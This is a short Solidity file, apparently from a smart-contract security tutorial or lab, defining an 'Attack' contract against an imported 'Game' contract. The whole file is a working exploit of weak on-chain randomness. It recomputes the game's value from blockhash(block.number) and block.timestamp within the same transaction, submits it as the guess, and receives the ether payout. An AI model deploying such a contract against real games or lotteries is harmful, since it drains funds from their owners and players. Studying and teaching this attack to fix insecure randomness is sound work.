//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Game.sol";

contract Attack {
    Game game;

    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    function attack() public {
        uint _guess = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    receive() external payable {}
}
